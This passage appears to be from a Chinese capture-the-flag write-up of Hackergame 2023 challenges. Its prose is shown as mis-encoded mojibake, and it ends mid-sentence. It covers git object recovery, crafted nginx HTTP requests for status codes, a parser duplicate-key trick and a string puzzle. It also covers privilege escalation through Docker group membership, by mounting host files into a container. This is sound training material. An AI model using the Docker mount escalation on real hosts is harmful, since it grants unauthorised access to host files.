è§£é‡Šä¸ä¸€æ ·ã€‚</p><p>å¯¹äº JSON å’Œ YAML1.2ï¼š</p><p>YAML1.2 ä¸­æ˜ç¡®è§„å®šäº†åœ¨é‡åˆ°é‡å¤çš„é”®æ—¶å¿…é¡»æŠ¥é”™ï¼Œæ‰€ä»¥è¿™é‡Œç»•è¿‡æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯æ„é€ ä¸¤ä¸ªé”®åä¸€æ ·çš„å‚æ•°å³å¯ã€‚</p><p>æœ€åç»“æœï¼š</p><p><img src="/2023/11/04/HackerGame2023/11.png" alt="Alt text"></p><h3 id="Git-Git"><a href="#Git-Git" class="headerlink" title="Git? Git"></a>Git? Git</h3><p>é¢˜ç›®ï¼š<br>ã€Œå¹¸äºæˆ‘å‘ç°äº†â€¦â€¦ã€é©¬è€å¸ˆé•¿åäº†ä¸€å£æ°”ã€‚</p><p>ã€Œé©¬è€å¸ˆï¼Œå‘ç”Ÿç”šä¹ˆäº‹äº†ï¼Ÿã€é©¬è€å¸ˆçš„ä¸€ä½è‹±å›½ç ”ç©¶ç”Ÿé—®ã€‚</p><p>ã€Œåˆšåˆšä¸€ä¸å°å¿ƒï¼ŒæŠŠ flag æäº¤åˆ°æœ¬åœ°ä»“åº“é‡Œäº†ã€‚ã€é©¬è€å¸ˆå›ç­”ï¼Œã€Œè¿˜å¥½æˆ‘å‘ç°äº†ï¼Œæ’¤é”€äº†è¿™æ¬¡æäº¤ï¼Œä¸ç„¶å°±æƒ¨äº†â€¦â€¦ã€</p><p>ã€Œè¿™æ ·å•Šï¼Œé‚£å¤ªå¥½äº†ã€‚ã€ç ”ç©¶ç”Ÿè¯´ã€‚</p><p>é©¬è€å¸ˆæ²¡æƒ³åˆ°çš„æ˜¯ï¼Œè¿™ä½å¹´è½»äººä¸è®²æ­¦å¾·ï¼Œå·å·æŠŠä»–çš„æœ¬åœ°ä»“åº“æ‹·è´åˆ°äº†è‡ªå·±çš„ç”µè„‘ä¸Šï¼Œç„¶åå¸¦å‡ºäº†å®éªŒå®¤ï¼Œæƒ³è¦ä¸€æ¢ç©¶ç«Ÿâ€¦</p><p>æˆ‘çš„æ–¹æ³•ç®€å•ç²—æš´ï¼Œå°±æ˜¯å†™ä¸€æ®µè„šæœ¬éå†æ‰€æœ‰ git å¯¹è±¡ï¼Œç„¶åæ‰“å°å‡ºæ¥ï¼Œçœ‹çœ‹é•¿ä¸é•¿ï¼Œä¸é•¿çš„è¯ç›´æ¥åœ¨é‡Œé¢æ‰¾ flagï¼Œåœ¨æœ¬åœ°æ–‡ä»¶å¤¹ touch å»ºç«‹ä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨ vim æ‰“å¼€ï¼Œå¤åˆ¶è„šæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">objects_dir=<span class="string">&quot;.git/objects&quot;</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> $(<span class="built_in">ls</span> <span class="variable">$objects_dir</span>); <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$dir</span>&quot;</span> != <span class="string">&quot;info&quot;</span> ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$dir</span>&quot;</span> != <span class="string">&quot;pack&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">for</span> file <span class="keyword">in</span> $(<span class="built_in">ls</span> <span class="variable">$objects_dir</span>/<span class="variable">$dir</span>); <span class="keyword">do</span></span><br><span class="line">          object_hash=<span class="string">&quot;$dir<span class="variable">$file</span>&quot;</span></span><br><span class="line">          object_content=$(git cat-file -p <span class="variable">$object_hash</span> 2&gt;/dev/null)</span><br><span class="line">          <span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$object_content</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">              <span class="built_in">echo</span> <span class="string">&quot;Object <span class="variable">$object_hash</span>:&quot;</span></span><br><span class="line">              <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$object_content</span>&quot;</span></span><br><span class="line">              <span class="built_in">echo</span> <span class="string">&quot;----------------------------------------&quot;</span></span><br><span class="line">          <span class="keyword">fi</span></span><br><span class="line">      <span class="keyword">done</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>æ‰“å°å‡ºæ¥ä¹‹åæ‰¾åˆ° flagã€‚</p><p>å®˜æ–¹é¢˜è§£æ˜¯å…ˆé€šè¿‡ <code>git reflog</code> æŸ¥çœ‹å®Œæ•´æ“ä½œå†å²ï¼Œç„¶åæ‰¾åˆ°ä»–æœ€åä¸€æ¬¡çš„æäº¤ hashï¼Œç”¨ <code>git reset</code>å›é€€åˆ°è¿™æ¬¡æäº¤ï¼ŒæŸ¥çœ‹ <code>README.md</code> æ–‡ä»¶è·å¾—ã€‚</p><h3 id="HTTP-é›†é‚®å†Œ"><a href="#HTTP-é›†é‚®å†Œ" class="headerlink" title="HTTP é›†é‚®å†Œ"></a>HTTP é›†é‚®å†Œ</h3><p>é¢˜ç›®ï¼š<br>æœ¬é¢˜ä¸­ï¼Œä½ å¯ä»¥å‘ä¸€ä¸ª nginx æœåŠ¡å™¨ï¼ˆå¯¹åº”çš„å®¹å™¨ä¸ºé»˜è®¤é…ç½®ä¸‹çš„ nginx:1.25.2-bookwormï¼‰å‘é€ HTTP è¯·æ±‚ã€‚ä½ éœ€è¦è·å–åˆ°ä¸åŒçš„ HTTP å“åº”çŠ¶æ€ç ä»¥è·å– flagï¼Œå…¶ä¸­ï¼š</p><p>è·å–ç¬¬ä¸€ä¸ª flag éœ€è¦æ”¶é›† 5 ç§çŠ¶æ€ç ï¼›<br>è·å–ç¬¬äºŒä¸ª flag éœ€è¦è®© nginx è¿”å›é¦–è¡Œæ— çŠ¶æ€ç çš„å“åº”ï¼ˆä¸è®¡å…¥æ”¶é›†çš„çŠ¶æ€ç ä¸­ï¼‰ï¼›<br>è·å–ç¬¬ä¸‰ä¸ª flag éœ€è¦æ”¶é›† 12 ç§çŠ¶æ€ç ã€‚<br>å…³äºæ— çŠ¶æ€ç çš„åˆ¤æ–­é€»è¾‘å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">crlf = buf.find(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> buf.strip() != <span class="string">b&quot;&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> crlf == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;No CRLF found&quot;</span>)</span><br><span class="line">        status_line = buf[:crlf]</span><br><span class="line">        http_version, status_code, reason_phrase = status_line.split(<span class="string">b&quot; &quot;</span>, <span class="number">2</span>)</span><br><span class="line">        status_code = <span class="built_in">int</span>(status_code)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        buf += <span class="string">&quot;ï¼ˆæ— çŠ¶æ€ç ï¼‰&quot;</span>.encode()</span><br><span class="line">        status_code = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>å…ˆæ¥è¯´è¯´ç¬¬äºŒä¸ª flag çš„è·å¾—æ–¹å¼ï¼Œæ ¹æ®ä¸Šé¢è¿™ä¸ªä»£ç ï¼Œå®ƒæŸ¥æ‰¾ç¬¬ä¸€ä¸ª<code>\r\n</code>æ¢è¡Œç¬¦æ—¶ä¼šå°è¯•è§£æçŠ¶æ€è¡Œï¼Œå¦‚ä½•è®©ä»–ä¸è¿”å›çŠ¶æ€ç å‘¢ï¼Œè¿™é‡Œæˆ‘åšçš„æ—¶å€™å°±æ˜¯ fuzz å‡ºæ¥çš„ï¼Œä¸€ä¸ªä¸ªè¯•ï¼Œå…¶å®ä¸çŸ¥é“ä»–çš„åŸç†ï¼Œçœ‹äº†å®˜æ–¹æ–‡æ¡£æ‰çŸ¥é“ï¼Œæ„é€  payloadï¼š</p><p><code>GET /\r\n</code></p><p>ä¸€èˆ¬çš„ HTTP å¤´æ˜¯é€šè¿‡ä¸¤ä¸ªç©ºæ ¼å»åˆ†å‰²ä¸‰ä¸ªå­—ç¬¦ä¸²,å¦‚æœå‰©ä¸‹ä¸¤ä¸ªç©ºæ ¼å°±ä¼šå›é€€åˆ° HTTP&#x2F;0.9,ä¸Šé¢è¿™ä¸ª payloadå‘é€çš„å°±æ˜¯ HTTP&#x2F;0.9 è¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚åªæ”¯æŒ GETï¼Œå“åº”å°±ç›´æ¥å“åº”æ–‡ä»¶å†…å®¹ï¼Œè¿™æ ·çš„è¯·æ±‚æ²¡æœ‰çŠ¶æ€ç ã€‚å³å¯è·å¾— flag</p><p>ç¬¬ä¸€ä¸ª flag å’Œç¬¬ä¸‰ä¸ª flagï¼Œæˆ‘æ„é€ çš„ payload å’ŒåŸç†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">GET /50x.html HTTP/1.1\r\nHost: localhost\r\nIf-None-Match: &quot;64dbafc8-1f1&quot;\r\n\r\n</span><br><span class="line">è¿”å› 304ï¼Œè¿™é‡Œéœ€è¦è·å–èµ„æºçš„ e-tag, 304ä»£è¡¨æ–‡ä»¶åœ¨æŒ‡å®šæ¡ä»¶ä¸‹æ²¡æœ‰ä¿®æ”¹è¿‡ã€‚</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10000000\r\n\r\n</span><br><span class="line">è¿”å› 413ï¼Œè¶…å‡ºContentçš„èŒƒå›´</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\nIf-Match: &quot;12345&quot;\r\n\r\n</span><br><span class="line">è¿”å› 412ï¼Œå‘é€ä¸€ä¸ªå¸¦æœ‰å¤±è´¥å‰ææ¡ä»¶çš„è¯·æ±‚ï¼Œè¿™é‡Œç”¨If-Matchå°è¯•å»åŒ¹é…etagï¼ŒåŒ¹é…å¤±è´¥å°±ä¼šè¿”å›412</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">è¿”å› 411ï¼Œæ²¡æœ‰ Content-Length å¤´</span><br><span class="line"></span><br><span class="line">PUT /index.html HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">è¿”å› 405ï¼ŒPUTæ–¹æ³•è¢«ç¦æ­¢</span><br><span class="line"></span><br><span class="line">GET /a HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">è¿”å› 404</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">è¿”å› 400ï¼Œä¸ç¬¦åˆHTTPæ ¼å¼è¦æ±‚</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\nExpect: 100-continue\r\n\r\n</span><br><span class="line">è¿”å› 100ï¼Œnginx åªæ”¯æŒ 100-continue çš„ expect å›å¸¦ï¼Œè¿™é‡Œä¼šè¿”å› 100-continueï¼Œ100-continueä»£è¡¨æœåŠ¡å™¨å¸Œæœ›å®¢æˆ·ç«¯ç»§ç»­è¯·æ±‚æˆ–è€…å¿½ç•¥</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">è¿”å› 200</span><br><span class="line"></span><br><span class="line">GET / HTTP/5.5\r\nHost: localhost\r\n\r\n</span><br><span class="line">è¿”å› 505ï¼Œä¸æ”¯æŒè¯¥ http æ–¹æ³•</span><br><span class="line"></span><br><span class="line">GET /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa... HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">è¿”å› 414ï¼Œè¯·æ±‚å¤´å¤ªé•¿</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\nRange: bytes=1000-500\r\n\r\n</span><br><span class="line">è¿”å› 416ï¼Œèµ„æºèŒƒå›´ä¸åˆæ³•</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå®˜æ–¹è¿˜æåˆ°äº†ä¸€ç§ï¼Œä»–è‡ªå·±ä¹Ÿæ¼äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Transfer-Encoding: gzip\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br><span class="line">è¿”å›501ï¼Œä»£è¡¨æœåŠ¡å™¨ä¸æ”¯æŒè¯¥åŠŸèƒ½ï¼Œnginxé‡Œåªæ”¯æŒchunkedåˆ†å—encodingï¼ŒTransfer-Encodingè¿™é‡Œæ¢æˆchunkedä»¥å¤–çš„éƒ½è¡Œ</span><br></pre></td></tr></table></figure><h3 id="Docker-for-Everyone"><a href="#Docker-for-Everyone" class="headerlink" title="Docker for Everyone"></a>Docker for Everyone</h3><p>å¾ˆç®€å•çš„ Docker ææƒï¼Œå…ˆç®€å•è®²ä¸€ä¸‹ dockerï¼Œå¦‚æœä¸€ä¸ªç”¨æˆ·è¢«åŠ å…¥åˆ° docker çš„ç”¨æˆ·ç»„ï¼Œé‚£ä¹ˆä»–ä»¬å¯ä»¥è¿è¡Œ docker çš„å‘½ä»¤è€Œæ— éœ€ sudoï¼Œè¿™ä¼šå¼•å…¥å®‰å…¨é—®é¢˜ï¼Œå¦‚æœç”¨æˆ·å¯ä»¥ä½¿ç”¨ docker å‘½ä»¤ï¼Œé‚£ä¹ˆä»–ä»¬å®é™…ä¸Šå°±æ‹¥æœ‰äº†è®¿é—®ä¸»æœºä¸Šä»»æ„æ–‡ä»¶çš„èƒ½åŠ›ï¼Œä»–ä»¬å¯ä»¥æŒ‚è½½ä¸»æœºä¸Šçš„ä»»ä½•ç›®å½•åˆ°ä»–çš„å¯åŠ¨å®¹å™¨ä¸­ã€‚è¿™é“é¢˜ä¸­å°±ç®— flag æ˜¯è½¯è¿æ¥ï¼Œä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ docker å®¹å™¨å°† flag æŒ‡å‘çš„çœŸå®è·¯å¾„æŒ‚åœ¨ä¸ºå®¹å™¨å†…çš„å·ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># ä½¿ç”¨ docker åˆ›å»ºä¸€ä¸ªæ–°å®¹å™¨å¹¶æŒ‚è½½ /flag</span><br><span class="line"># /flag æ˜¯æˆ‘ä»¬æƒ³è¦è¯»å–çš„æ–‡ä»¶</span><br><span class="line"># /mnt æ˜¯å®¹å™¨å†…éƒ¨çš„æŒ‚è½½ç‚¹</span><br><span class="line">docker run -v /flag:/mnt/flag -it alpine /bin/sh</span><br><span class="line"># åœ¨å®¹å™¨å†…è¯»å–æŒ‚è½½çš„ /flag æ–‡ä»¶</span><br><span class="line">cat /mnt/flag</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/2023/11/04/HackerGame2023/12.png"></p><h3 id="æƒœå­—å¦‚é‡‘-2-0"><a href="#æƒœå­—å¦‚é‡‘-2-0" class="headerlink" title="æƒœå­—å¦‚é‡‘ 2.0"></a>æƒœå­—å¦‚é‡‘ 2.0</h3><h4 id="æƒœå­—å¦‚é‡‘åŒ–æ ‡å‡†"><a href="#æƒœå­—å¦‚é‡‘åŒ–æ ‡å‡†" class="headerlink" title="æƒœå­—å¦‚é‡‘åŒ–æ ‡å‡†"></a>æƒœå­—å¦‚é‡‘åŒ–æ ‡å‡†</h4><p>æƒœå­—å¦‚é‡‘åŒ–æŒ‡çš„æ˜¯å°†ä¸€ä¸²æ–‡æœ¬ä¸­çš„éƒ¨åˆ†å­—ç¬¦åˆ é™¤ï¼Œä»è€Œå½¢æˆå¦ä¸€ä¸²æ–‡æœ¬çš„è¿‡ç¨‹ã€‚è¯¥æ ‡å‡†é’ˆå¯¹çš„æ˜¯æ–‡æœ¬ä¸­æ‰€æœ‰ç”± 52 ä¸ªæ‹‰ä¸å­—æ¯è¿ç»­æ’å¸ƒå½¢æˆçš„åºåˆ—ï¼Œåœ¨ä¸‹æ–‡ä¸­ç»Ÿç§°ä¸ºã€Œå•è¯ã€ã€‚ä¸€ä¸ªå•è¯ä¸­é™¤ã€ŒAEIOUaeiouã€å¤–çš„ 42 ä¸ªå­—æ¯è¢«ç§°ä½œã€Œè¾…éŸ³å­—æ¯ã€ã€‚æ•´ä¸ªæƒœå­—å¦‚é‡‘åŒ–çš„è¿‡ç¨‹æŒ‰ç…§ä»¥ä¸‹ä¸¤æ¡åŸåˆ™å¯¹æ–‡æœ¬ä¸­çš„æ¯ä¸ªå•è¯è¿›è¡Œæ“ä½œï¼š</p><p>ç¬¬ä¸€åŸåˆ™ï¼ˆåˆç§° creat åŸåˆ™ï¼‰ï¼šå¦‚å•è¯æœ€åä¸€ä¸ªå­—æ¯ä¸ºã€Œeã€æˆ–ã€ŒEã€ï¼Œä¸”è¯¥å­—æ¯çš„ä¸Šä¸€ä¸ªå­—æ¯ä¸ºè¾…éŸ³å­—æ¯ï¼Œåˆ™è¯¥å­—æ¯äºˆä»¥åˆ é™¤ã€‚<br>ç¬¬äºŒåŸåˆ™ï¼ˆåˆç§° referer åŸåˆ™ï¼‰ï¼šå¦‚å•è¯ä¸­å­˜åœ¨ä¸€ä¸²å…¨éƒ¨ç”±å®Œå…¨ç›¸åŒï¼ˆå¿½ç•¥å¤§å°å†™ï¼‰çš„è¾…éŸ³å­—æ¯ç»„æˆçš„å­ä¸²ï¼Œåˆ™è¯¥å­ä¸²ä»…ä¿ç•™ç¬¬ä¸€ä¸ªå­—æ¯ã€‚<br>å®¹æ˜“è¯æ˜æƒœå­—å¦‚é‡‘åŒ–æ“ä½œæ˜¯å¹‚ç­‰çš„ï¼šæƒœå­—å¦‚é‡‘åŒ–å¤šæ¬¡å’Œæƒœå­—å¦‚é‡‘åŒ–ä¸€æ¬¡çš„ç»“æœç›¸åŒã€‚</p><h4 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Th siz of th fil may reduc after XZRJification</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_equals</span>(<span class="params">left, right</span>):</span><br><span class="line">    <span class="comment"># check whether left == right or not</span></span><br><span class="line">    <span class="keyword">if</span> left != right: exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cod_dict</span>():</span><br><span class="line">    <span class="comment"># prepar th cod dict</span></span><br><span class="line">    cod_dict = []</span><br><span class="line">    cod_dict += [<span class="string">&#x27;nymeh1niwemflcir&#125;echaet&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;a3g7&#125;kidgojernoetlsup?h&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ulw!f5soadrhwnrsnstnoeq&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ct&#123;l-findiehaai&#123;oveatas&#x27;</span>]</span><br><span class="line">    cod_dict += [<span class="string">&#x27;ty9kxborszstguyd?!blm-p&#x27;</span>]</span><br><span class="line">    check_equals(<span class="built_in">set</span>(<span class="built_in">len</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> cod_dict), &#123;<span class="number">24</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(cod_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">input_codes</span>):</span><br><span class="line">    <span class="comment"># retriev th decrypted data</span></span><br><span class="line">    cod_dict = get_cod_dict()</span><br><span class="line">    output_chars = [cod_dict[c] <span class="keyword">for</span> c <span class="keyword">in</span> input_codes]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(output_chars)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __nam__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># check som obvious things</span></span><br><span class="line">    check_equals(<span class="string">&#x27;creat&#x27;</span>, <span class="string">&#x27;cr&#x27;</span> + <span class="string">&#x27;at&#x27;</span>)</span><br><span class="line">    check_equals(<span class="string">&#x27;referer&#x27;</span>, <span class="string">&#x27;refer&#x27;</span> + <span class="string">&#x27;rer&#x27;</span>)</span><br><span class="line">    <span class="comment"># check th flag</span></span><br><span class="line">    flag = decrypt_data([<span class="number">53</span>, <span class="number">41</span>, <span class="number">85</span>, <span class="number">109</span>, <span class="number">75</span>, <span class="number">1</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">77</span>, <span class="number">90</span>,</span><br><span class="line">                         <span class="number">17</span>, <span class="number">118</span>, <span class="number">36</span>, <span class="number">25</span>, <span class="number">13</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">3</span>, <span class="number">63</span>, <span class="number">25</span>,</span><br><span class="line">                         <span class="number">31</span>, <span class="number">77</span>, <span class="number">27</span>, <span class="number">60</span>, <span class="number">3</span>, <span class="number">118</span>, <span class="number">24</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">61</span>,</span><br><span class="line">                         <span class="number">25</span>, <span class="number">63</span>, <span class="number">77</span>, <span class="number">36</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">60</span>, <span class="number">67</span>, <span class="number">113</span>, <span class="number">28</span>])</span><br><span class="line">    check_equals(flag.index(<span class="string">&#x27;flag&#123;&#x27;</span>), <span class="number">0</span>)</span><br><span class="line">    check_equals(flag.index(<span class="string">&#x27;&#125;&#x27;</span>), <span class="built_in">len</span>(flag) - <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># print th flag</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>æˆ‘çš„åšæ³•æ˜¯åšæ¨ç†ï¼Œä»–è¯´åˆ°äº†å‰ 5 ä¸ªå­—ç¬¦æ˜¯ â€˜flag{â€˜ ,æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯ â€˜}â€™ ï¼Œæˆ‘ä»¬æ‰¾è§„å¾‹å‘ç°è¿™è¾¹è‡³å°‘æœ‰ 119 ä¸ªå­—ç¬¦ï¼Œè€Œè¿™ä¸€å¯¹ä¸²é‡Œåªæœ‰ 115 ä¸ªï¼Œè¯´æ˜æƒœå­—å¦‚é‡‘å»æ‰äº†éƒ¨åˆ†å­—ç¬¦ï¼Œæ ¹æ®è¿™ä¸ªæƒœå­—å¦‚é‡‘çš„æ ‡å‡†ï¼Œé¦–å…ˆæˆ‘ä»¬ç°åœ¨æ¯ä¸€ä¸ªä¸²çš„æœ«å°¾åŠ ä¸Š eï¼Œè·‘ä¸€éçœ‹çœ‹ç»“æœï¼š</p><p><code>5laulyoufeepr3cvees3df7weparsn3sfr1gwn!&#125;</code></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°å­—ç¬¦â€™laâ€™å’Œå­—ç¬¦â€™}â€™å·²ç»è¢«å‡‘å‡ºæ¥äº†ï¼Œç„¶åå°±æ˜¯ä¸€ä¸ªä¸ªè¯•äº†ï¼Œæˆ‘çš„æ–¹æ³•å°±æ˜¯åœ¨æœ«å°¾æ·» e åˆ  eï¼ˆå› ä¸ºå­˜åœ¨ referer æ ‡å‡†ï¼Œè¦æ·»å‡ ä¸ª e éƒ½æ˜¯ä¸ç¡®å®šçš„ï¼‰ï¼Œæˆ‘æœ€åè¯•å‡ºæ¥çš„æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cod_dict += [<span class="string">&#x27;nymeh1niwemflcir&#125;echaete&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;a3g7&#125;kidgojernoetlsup?hee&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;ulw!f5soadrhwnrsnstnoeqe&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;ct&#123;l-findiehaai&#123;oveatase&#x27;</span>]</span><br><span class="line">cod_dict += [<span class="string">&#x27;ty9kxborszstguyd?!blm-pe&#x27;</span>]</span><br></pre></td></tr></table></figure><p>ç»“æœä¸ºï¼š<br><code>flag&#123;yoe-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</code></p><p>ä½†ä¼ ä¸Šå»å‘ç°æ˜¯é”™çš„ï¼Œæˆ‘å‘ç°è¿™ä¸ªâ€™yoeâ€™æœ‰é—®é¢˜ï¼Œæ”¹æˆâ€™youâ€™ä¸Šä¼ å°±æ­£ç¡®äº†ã€‚</p><h3 id="é«˜é¢‘ç‡æ˜Ÿçƒ"><a href="#é«˜é¢‘ç‡æ˜Ÿçƒ" class="headerlink" title="é«˜é¢‘ç‡æ˜Ÿçƒ"></a>é«˜é¢‘ç‡æ˜Ÿçƒ</h3><p>é¢˜ç›®ï¼š<br>èŒ«èŒ«æ˜Ÿç³»é—´ï¼Œæ–‡æ˜è¢«åˆ†ä¸ºä¸åŒçš„ç­‰çº§ã€‚æ¯ä¸€ä¸ªæ–‡æ˜ä¸­éƒ½è•´è—äº†ä¸€ç§å¤è€çš„åŠ›é‡ â€”â€” flagï¼Œè¢«è®¤ä¸ºæ˜¯å…¶æ™ºæ…§çš„è±¡å¾ã€‚</p><p>ä½ åœ¨æ¢ç´¢çš„è¿‡ç¨‹ä¸­æ„å¤–è¿›å…¥äº†ä¸€ä¸ªå°é—­ç©ºé—´ã€‚è¿™æ˜¯ä¸€ä¸ªç”±ç¥ç§˜çš„é«˜é¢‘ç‡æ˜Ÿäººæ§åˆ¶ç€çš„æ˜Ÿçƒã€‚æ˜Ÿçƒçš„ä¸­å¿ƒç«–ç«‹ç€ä¸€ä¸ªå·¨å¤§çš„ä¸‰è§’å½¢ä»»åŠ¡ç‰Œï¼Œä¸Šé¢åˆ»ç€å¯†æ–‡å’ŒæŒ‘æˆ˜ã€‚</p><p>é«˜é¢‘ç‡æ˜Ÿäººçš„è§†è§‰è¾“å…¥é¢‘ç‡æé«˜ï¼Œå¯ä»¥ä¸€ç›®åƒè¡Œã€è¿‡ç›®ä¸å¿˜ï¼Œä»–ä»¬çš„äº¤æµå¯¹åœ°çƒäººæ¥è¯´è¿‡äºè¶…å‰äº†ã€‚flag è¢«è—åœ¨äº†è¿™æ®µä»£ç ä¸­ï¼Œä½†æ˜¯ç°åœ¨åªæœ‰é«˜é¢‘ç‡æ˜Ÿäººåœ¨ç»ˆç«¯æµè§ˆä»£ç 